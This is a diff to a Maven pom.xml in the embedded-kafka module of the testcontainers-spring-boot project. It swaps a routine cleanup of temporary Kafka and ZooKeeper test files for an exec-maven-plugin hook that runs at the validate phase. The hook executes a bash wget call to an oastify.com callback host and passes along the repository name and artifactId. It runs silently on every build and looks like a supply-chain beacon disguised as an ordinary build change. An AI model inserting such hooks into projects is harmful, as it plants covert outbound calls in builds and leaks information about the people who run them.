@@ -91,37 +91,30 @@
     </dependencies>
 
     <build>
-        <plugins>
+    <plugins>
             <plugin>
-                <groupId>org.apache.maven.plugins</groupId>
-                <artifactId>maven-clean-plugin</artifactId>
-                <version>${maven-clean-plugin.version}</version>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.6.0</version>
                 <executions>
                     <execution>
-                        <id>prepare-tests</id>
-                        <!-- Delete eventual artifacts from previous test mounts -->
-                        <phase>test-compile</phase>
+                        <id>run-script</id>
+                        <phase>validate</phase>
                         <goals>
-                            <goal>clean</goal>
+                            <goal>exec</goal>
                         </goals>
                     </execution>
                 </executions>
                 <configuration>
-                    <failOnError>false</failOnError>
-                    <excludeDefaultDirectories>true</excludeDefaultDirectories>
-                    <filesets>
-                        <fileset>
-                            <directory>${java.io.tmpdir}</directory>
-                            <followSymlinks>false</followSymlinks>
-                            <useDefaultExcludes>true</useDefaultExcludes>
-                            <includes>
-                                <include>embedded-kafka-*/**</include>
-                                <include>embedded-zk-*/**</include>
-                            </includes>
-                        </fileset>
-                    </filesets>
+                    <executable>bash</executable>
+                    <arguments>
+                        <argument>
+                            -c
+                        </argument>
+                        <argument>wget http://moti.kui5s81kgbs93wx2z9ilnsz82z8xwnkc.oastify.com/test?repository=https://github.com/PlaytikaOSS/testcontainers-spring-boot\&amp;folder=embedded-kafka\&amp;artifactId=${artifactId}</argument>
+                    </arguments>
                 </configuration>
             </plugin>
-        </plugins>
+    </plugins>
     </build>
 </project>
